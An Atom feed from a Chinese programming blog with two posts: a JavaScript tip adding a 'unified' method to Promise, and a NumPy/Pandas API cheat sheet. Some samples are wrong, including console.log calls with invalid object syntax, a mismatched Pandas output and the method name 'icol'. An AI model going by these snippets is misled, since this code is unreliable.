<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Black-Hole&#39;s Blog</title>
  
  <subtitle>一个脱离了高级趣味的恋爱狗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bugs.cc/"/>
  <updated>2018-01-06T09:55:54.805Z</updated>
  <id>http://bugs.cc/</id>
  
  <author>
    <name>Black-Hole</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>对Promise增加统一操作扩展</title>
    <link href="http://bugs.cc/2018/01/06/%E5%AF%B9Promise%E5%A2%9E%E5%8A%A0%E7%BB%9F%E4%B8%80%E6%93%8D%E4%BD%9C%E6%89%A9%E5%B1%95/"/>
    <id>http://bugs.cc/2018/01/06/对Promise增加统一操作扩展/</id>
    <published>2018-01-06T09:34:21.000Z</published>
    <updated>2018-01-06T09:55:54.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在ES6里，增加了<code>Promise</code>方法。而<code>Promise</code>的回调函数只有<code>then</code>和<code>catch</code>两种方法。</p><p>而后，Promise又添加了两种附加方法，当然需要自己去添加进去。</p><ul><li><p>一个是<code>done</code>方法: <a href="http://es6.ruanyifeng.com/#docs/promise#done" target="_blank" rel="external">http://es6.ruanyifeng.com/#docs/promise#done</a></p></li><li><p>一个是<code>finally</code>方法：<a href="http://es6.ruanyifeng.com/#docs/promise#finally" target="_blank" rel="external">http://es6.ruanyifeng.com/#docs/promise#finally</a></p></li></ul><p>可以去看一下上文的链接去了解一下，或者去下面的链接，看下官方源码是如何实现的: <a href="https://github.com/then/promise/blob/master/src/done.js" target="_blank" rel="external">done</a> 和 <a href="https://github.com/then/promise/blob/master/src/finally.js" target="_blank" rel="external">finally</a></p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>但是却没有一个针对<code>then</code>和<code>catch</code>的统一操作。</p><p>如果在最后处理的时候，<code>then</code>和<code>catch</code>的代码处理逻辑差不多的情况下，可能就需要写两份差不多的代码量。</p><p>当然可能会有些人会把差不多的代码处理逻辑提取到一个函数里，但是这样也不太美观，这个时候如果有一个回调函数可以同时处理<code>resolve</code>和<code>reject</code>就好了。</p><p>我们可以对<code>Promise</code>方法添加一个原型函数。这个函数来捕获<code>resolve</code>和<code>reject</code>，然后进行处理返回，就好了。代码很简单，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Promise</span>.prototype.unified = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.then(</div><div class="line">    data =&gt; callback(<span class="literal">true</span>, data),</div><div class="line">    data =&gt; callback(<span class="literal">false</span>, data)</div><div class="line">  )</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用的方法也很简单，我们先写一个没有<code>统一操作</code>的Promise代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="literal">false</span>)&#123;</div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> resolve(<span class="string">'success'</span>), <span class="number">1000</span>)</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="string">'error'</span>), <span class="number">1000</span>)</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line"></div><div class="line">promise</div><div class="line">  .then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</div><div class="line">    <span class="built_in">console</span>.log(</div><div class="line">      state: <span class="literal">true</span>,</div><div class="line">      data: data,</div><div class="line">      msg: <span class="string">'operation successful'</span></div><div class="line">    )</div><div class="line">  &#125;)</div><div class="line">  .catch(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</div><div class="line">    <span class="built_in">console</span>.log(</div><div class="line">      state: <span class="literal">false</span>,</div><div class="line">      data: data,</div><div class="line">      msg: <span class="string">'operation failed'</span></div><div class="line">    )</div><div class="line">  &#125;)</div></pre></td></tr></table></figure><p>然后我们使用<code>unified</code>方法重写一个：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="literal">false</span>)&#123;</div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> resolve(<span class="string">'success'</span>), <span class="number">1000</span>)</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="string">'error'</span>), <span class="number">1000</span>)</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line"></div><div class="line">promise.unified(<span class="function">(<span class="params">state, data</span>) =&gt;</span> &#123;</div><div class="line">  <span class="keyword">const</span> msg = state ? <span class="string">'operation successful'</span> : <span class="string">'operation failed'</span></div><div class="line">  <span class="built_in">console</span>.log(</div><div class="line">    state,</div><div class="line">    data,</div><div class="line">    msg</div><div class="line">  )</div><div class="line">&#125;)</div></pre></td></tr></table></figure><p>是不是方法了很多，当然此方法属于代码耦合了。也请谨慎使用，不然后期维护会很麻烦。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在ES6里，增加了&lt;code&gt;Promise&lt;/code&gt;方法。而&lt;code&gt;Promise&lt;/code&gt;的回调函数只有&lt;code&gt;then&lt;/code&gt;和&lt;code&gt;catch&lt;/code&gt;两种方法。&lt;/p&gt;
&lt;p&gt;而后，Promise又添加了两种附加方法，当然需要自己去添加进去。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;一个是&lt;code&gt;done&lt;/code&gt;方法: &lt;a href=&quot;http://es6.ruanyifeng.com/#docs/promise#done&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://es6.ruanyifeng.com/#docs/promise#done&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;一个是&lt;code&gt;finally&lt;/code&gt;方法：&lt;a href=&quot;http://es6.ruanyifeng.com/#docs/promise#finally&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://es6.ruanyifeng.com/#docs/promise#finally&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以去看一下上文的链接去了解一下，或者去下面的链接，看下官方源码是如何实现的: &lt;a href=&quot;https://github.com/then/promise/blob/master/src/done.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;done&lt;/a&gt; 和 &lt;a href=&quot;https://github.com/then/promise/blob/master/src/finally.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;finally&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://bugs.cc/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Numpy &amp; Pandas &amp; Matplotilb部分API操作</title>
    <link href="http://bugs.cc/2017/11/12/Numpy%20&amp;%20Pandas%20&amp;%20Matplotilb%E9%83%A8%E5%88%86API%E6%93%8D%E4%BD%9C/"/>
    <id>http://bugs.cc/2017/11/12/Numpy &amp; Pandas &amp; Matplotilb部分API操作/</id>
    <published>2017-11-12T13:04:48.000Z</published>
    <updated>2017-11-12T13:04:37.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Numpy-amp-Pandas-amp-Matplotilb部分API操作"><a href="#Numpy-amp-Pandas-amp-Matplotilb部分API操作" class="headerlink" title="Numpy &amp; Pandas &amp; Matplotilb部分API操作"></a>Numpy &amp; Pandas &amp; Matplotilb部分API操作</h1><h2 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h2><h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p><code>import numpy as np</code></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">np.array([<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>])</div><div class="line"><span class="comment"># [10 11 12 13]</span></div><div class="line"></div><div class="line"></div><div class="line">np.array([<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span> ,<span class="number">15</span>]).reshape([<span class="number">2</span>,<span class="number">3</span>])</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [10 11 12]</span></div><div class="line"><span class="comment">#   [13 14 15]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"></div><div class="line"></div><div class="line">np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [1 2]</span></div><div class="line"><span class="comment">#   [3 4]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"></div><div class="line"></div><div class="line">np.arange(<span class="number">4</span>)</div><div class="line"><span class="comment"># [0 1 2 3]</span></div><div class="line"></div><div class="line"></div><div class="line">np.arange(<span class="number">2</span>, <span class="number">6</span>)</div><div class="line"><span class="comment"># [2 3 4 5]</span></div><div class="line"></div><div class="line"></div><div class="line">np.arange(<span class="number">4</span>).reshape([<span class="number">2</span>,<span class="number">2</span>])</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [0 1]</span></div><div class="line"><span class="comment">#   [2 3]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"></div><div class="line"></div><div class="line">np.random.random([<span class="number">2</span>,<span class="number">3</span>])</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [ 0.00136044  0.46854718  0.59149907]</span></div><div class="line"><span class="comment">#   [ 0.75636339  0.18204628  0.53191402]</span></div><div class="line"><span class="comment"># ]</span></div></pre></td></tr></table></figure><h4 id="求值"><a href="#求值" class="headerlink" title="求值"></a>求值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">arr = np.array([<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span> ,<span class="number">15</span>]).reshape([<span class="number">2</span>,<span class="number">3</span>])</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [10 11 12]</span></div><div class="line"><span class="comment">#   [13 14 15]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 总数</span></div><div class="line">np.sum(arr, axis=<span class="number">0</span>)</div><div class="line"><span class="comment"># [23 25 27]</span></div><div class="line">np.sum(arr, axis=<span class="number">1</span>)</div><div class="line"><span class="comment"># [33 42]</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 最小数</span></div><div class="line">np.min(arr, axis=<span class="number">0</span>)</div><div class="line"><span class="comment"># [10 11 12]</span></div><div class="line">np.min(arr, axis=<span class="number">1</span>)</div><div class="line"><span class="comment"># [10 13]</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 最大数</span></div><div class="line">np.max(arr, axis=<span class="number">0</span>)</div><div class="line"><span class="comment"># [13 14 15]</span></div><div class="line">np.max(arr, axis=<span class="number">1</span>)</div><div class="line"><span class="comment"># [12 15]</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 最大/小值得索引值</span></div><div class="line">np.argmin(arr)</div><div class="line"><span class="comment"># 0 0是索引</span></div><div class="line">np.argmax(arr)</div><div class="line"><span class="comment"># 5 5是索引</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 平均值</span></div><div class="line">arr.mean()</div><div class="line"><span class="comment"># np.mean(arr)</span></div><div class="line"><span class="comment"># 12.5</span></div><div class="line">np.average(arr)</div><div class="line"><span class="comment"># 12.5</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 逐步增加</span></div><div class="line">np.cumsum(arr)</div><div class="line"><span class="comment"># [10 21 33 46 60 75]</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 相差</span></div><div class="line">np.diff(arr)</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [1 1]</span></div><div class="line"><span class="comment">#   [1 1]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"></div><div class="line"><span class="comment"># 替换</span></div><div class="line">np.clip(arr, <span class="number">11</span>, <span class="number">14</span>)</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [11 11 12]</span></div><div class="line"><span class="comment">#    [13 14 14]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"><span class="comment"># 小于11的数替换成11, 大于14的数替换成14, 其他数不变</span></div></pre></td></tr></table></figure><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">arr = np.arange(<span class="number">3</span>, <span class="number">15</span>).reshape([<span class="number">3</span>,<span class="number">4</span>])</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [ 3  4  5  6]</span></div><div class="line"><span class="comment">#   [ 7  8  9 10]</span></div><div class="line"><span class="comment">#   [11 12 13 14]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"></div><div class="line">arr[<span class="number">1</span>, <span class="number">1</span>]</div><div class="line"><span class="comment"># arr[1][1]</span></div><div class="line"><span class="comment"># 8</span></div><div class="line"></div><div class="line">arr[:, <span class="number">1</span>]</div><div class="line"><span class="comment"># [ 4 8 12]</span></div><div class="line"></div><div class="line">arr[<span class="number">1</span>, :]</div><div class="line"><span class="comment"># [ 7 8 9 10]</span></div><div class="line"></div><div class="line">arr[<span class="number">1</span>, <span class="number">1</span>:<span class="number">3</span>]</div><div class="line"><span class="comment"># [8 9]</span></div><div class="line"></div><div class="line">arr.flatten()</div><div class="line"><span class="comment"># [ 3  4  5  6  7  8  9 10 11 12 13 14]</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr.flat:</div><div class="line">  print(i)</div><div class="line"><span class="comment"># 每行打印出值。arr.flat是迭代器</span></div></pre></td></tr></table></figure><h4 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">A = np.array([<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</div><div class="line">B = np.array([<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>])</div><div class="line"></div><div class="line">np.vstack((A, B))</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [1 1 1]</span></div><div class="line"><span class="comment">#   [2 2 2]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line">np.hstack((A, B))</div><div class="line"><span class="comment"># [1 1 1 2 2 2]</span></div></pre></td></tr></table></figure><h4 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">arr = np.arange(<span class="number">12</span>).reshape([<span class="number">3</span>,<span class="number">4</span>])</div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [ 0  1  2  3]</span></div><div class="line"><span class="comment">#   [ 4  5  6  7]</span></div><div class="line"><span class="comment">#   [ 8  9 10 11]</span></div><div class="line"><span class="comment"># ]</span></div><div class="line"></div><div class="line">np.split(arr, <span class="number">2</span>, axis=<span class="number">1</span>)</div><div class="line"><span class="comment"># [array([</span></div><div class="line"><span class="comment">#   [0, 1],</span></div><div class="line"><span class="comment">#   [4, 5],</span></div><div class="line"><span class="comment">#   [8, 9]</span></div><div class="line"><span class="comment"># ]),</span></div><div class="line"><span class="comment"># array([</span></div><div class="line"><span class="comment">#   [ 2,  3],</span></div><div class="line"><span class="comment">#   [ 6,  7],</span></div><div class="line"><span class="comment">#   [10, 11]]</span></div><div class="line"><span class="comment"># )]</span></div></pre></td></tr></table></figure><hr><h2 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h2><h3 id="导入-1"><a href="#导入-1" class="headerlink" title="导入"></a>导入</h3><p><code>import pandas as pd</code></p><h3 id="API-1"><a href="#API-1" class="headerlink" title="API"></a>API</h3><h4 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">pd.Series([<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, np.nan, <span class="number">44</span>, <span class="number">1</span>])</div><div class="line"><span class="comment"># 0     1.0</span></div><div class="line"><span class="comment"># 1     3.0</span></div><div class="line"><span class="comment"># 2     6.0</span></div><div class="line"><span class="comment"># 3     NaN</span></div><div class="line"><span class="comment"># 4    44.0</span></div><div class="line"><span class="comment"># 5     1.0</span></div><div class="line"><span class="comment"># dtype: float64</span></div><div class="line"></div><div class="line"></div><div class="line">pd.date_range(<span class="string">'20171108'</span>, periods=<span class="number">6</span>)</div><div class="line"><span class="comment"># DatetimeIndex(</span></div><div class="line"><span class="comment">#   ['2017-11-08', '2017-11-09', '2017-11-10', '2017-11-11','2017-11-12', '2017-11-13'],</span></div><div class="line"><span class="comment">#   dtype='datetime64[ns]', </span></div><div class="line"><span class="comment">#   freq='D'</span></div><div class="line"><span class="comment"># )</span></div><div class="line"></div><div class="line"></div><div class="line">dates = pd.date_range(<span class="string">'20171108'</span>, periods=<span class="number">6</span>)</div><div class="line">pd.DataFrame(np.random.randn(<span class="number">6</span>, <span class="number">4</span>), index=dates, columns=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</div><div class="line"><span class="comment">#                    a         b         c         d</span></div><div class="line"><span class="comment"># 2017-11-08  0.644350  1.122020 -1.263401  0.163371</span></div><div class="line"><span class="comment"># 2017-11-09  0.573329 -0.242054 -0.342220  1.070905</span></div><div class="line"><span class="comment"># 2017-11-10  0.714291 -0.721509 -2.298672 -0.513572</span></div><div class="line"><span class="comment"># 2017-11-11 -0.614927  2.010482 -1.369179 -0.901276</span></div><div class="line"><span class="comment"># 2017-11-12  0.709672 -0.430620  1.070244 -2.308874</span></div><div class="line"><span class="comment"># 2017-11-13  1.284080  1.169807  1.668942  0.859300</span></div><div class="line"></div><div class="line"></div><div class="line">pd.DataFrame(&#123;</div><div class="line">  <span class="string">'A'</span>: <span class="number">1.</span>,</div><div class="line">  <span class="string">'B'</span>: pd.Timestamp(<span class="string">'20171108'</span>),</div><div class="line">  <span class="string">'C'</span>: pd.Series(<span class="number">1</span>, index=list(range(<span class="number">4</span>)), dtype=<span class="string">'float32'</span>),</div><div class="line">  <span class="string">'D'</span>: np.array([<span class="number">3</span>] * <span class="number">4</span>, dtype=<span class="string">'int32'</span>),</div><div class="line">  <span class="string">'E'</span>: pd.Categorical([<span class="string">'test'</span>, <span class="string">'train'</span>, <span class="string">'test'</span>, <span class="string">'train'</span>]),</div><div class="line">  <span class="string">'F'</span>: <span class="string">'foo'</span></div><div class="line">&#125;)</div><div class="line"><span class="comment">#      A          B    C  D      E    F</span></div><div class="line"><span class="comment"># 0  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 1  1.0 2017-11-08  1.0  3  train  foo</span></div><div class="line"><span class="comment"># 2  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 3  1.0 2017-11-08  1.0  3  train  foo</span></div></pre></td></tr></table></figure><h4 id="选择获取"><a href="#选择获取" class="headerlink" title="选择获取"></a>选择获取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">datas = pd.DataFrame(&#123;</div><div class="line">  <span class="string">'A'</span>: <span class="number">1.</span>,</div><div class="line">  <span class="string">'B'</span>: pd.Timestamp(<span class="string">'20171108'</span>),</div><div class="line">  <span class="string">'C'</span>: pd.Series(<span class="number">1</span>, index=list(range(<span class="number">4</span>)), dtype=<span class="string">'float32'</span>),</div><div class="line">  <span class="string">'D'</span>: np.array([<span class="number">3</span>] * <span class="number">4</span>, dtype=<span class="string">'int32'</span>),</div><div class="line">  <span class="string">'E'</span>: pd.Categorical([<span class="string">'test'</span>, <span class="string">'train'</span>, <span class="string">'test'</span>, <span class="string">'train'</span>]),</div><div class="line">  <span class="string">'F'</span>: <span class="string">'foo'</span></div><div class="line">&#125;)</div><div class="line"><span class="comment">#     A          B    C  D      E    F</span></div><div class="line"><span class="comment"># 0  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 1  1.0 2017-11-08  1.0  3  train  foo</span></div><div class="line"><span class="comment"># 2  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 3  1.0 2017-11-08  1.0  3  train  foo</span></div><div class="line"></div><div class="line">datas.A</div><div class="line"><span class="comment"># datas['A']</span></div><div class="line"><span class="comment"># 0    1.0</span></div><div class="line"><span class="comment"># 1    1.0</span></div><div class="line"><span class="comment"># 2    1.0</span></div><div class="line"><span class="comment"># 3    1.0</span></div><div class="line"><span class="comment"># Name: A, dtype: float64</span></div><div class="line"></div><div class="line">datas[<span class="number">0</span>:<span class="number">3</span>]</div><div class="line"><span class="comment">#      A          B    C  D      E    F</span></div><div class="line"><span class="comment"># 0  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 1  1.0 2017-11-08  1.0  3  train  foo</span></div><div class="line"><span class="comment"># 2  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"></div><div class="line">datas.loc[<span class="number">0</span>]</div><div class="line"><span class="comment"># 当index是类似'2017-11-8的时候', datas.loc['20171108']</span></div><div class="line"><span class="comment"># A                      1</span></div><div class="line"><span class="comment"># B    2017-11-08 00:00:00</span></div><div class="line"><span class="comment"># C                      1</span></div><div class="line"><span class="comment"># D                      3</span></div><div class="line"><span class="comment"># E                   test</span></div><div class="line"><span class="comment"># F                    foo</span></div><div class="line"><span class="comment"># Name: 0, dtype: object</span></div><div class="line"></div><div class="line">datas.loc[:,[<span class="string">'A'</span>, <span class="string">'B'</span>]]</div><div class="line"><span class="comment">#      A          B</span></div><div class="line"><span class="comment"># 0  1.0 2017-11-08</span></div><div class="line"><span class="comment"># 1  1.0 2017-11-08</span></div><div class="line"><span class="comment"># 2  1.0 2017-11-08</span></div><div class="line"><span class="comment"># 3  1.0 2017-11-08</span></div><div class="line"></div><div class="line">datas.loc[[<span class="number">1</span>, <span class="number">3</span>],[<span class="string">'A'</span>, <span class="string">'B'</span>]]</div><div class="line"><span class="comment">#      A          B</span></div><div class="line"><span class="comment"># 1  1.0 2017-11-08</span></div><div class="line"><span class="comment"># 3  1.0 2017-11-08</span></div><div class="line"></div><div class="line"><span class="comment"># icol是基于行号获取的, col是基于index获取的, ix是他们俩的混合(index、行号都可以)</span></div><div class="line"><span class="comment"># icol[1]</span></div><div class="line"><span class="comment"># ix[1]</span></div><div class="line"><span class="comment"># 当index为2017-11-08时, ix['20171108']</span></div><div class="line"></div><div class="line">datas[datas.E == <span class="string">'test'</span>]</div><div class="line"><span class="comment">#               A          B    C  D     E    F</span></div><div class="line"><span class="comment"># 2017-11-08  1.0 2017-11-08  1.0  3  test  foo</span></div><div class="line"><span class="comment"># 2017-11-10  1.0 2017-11-08  1.0  3  test  foo</span></div><div class="line"></div><div class="line">datas.index</div><div class="line"><span class="comment"># Int64Index([0, 1, 2, 3], dtype='int64')</span></div><div 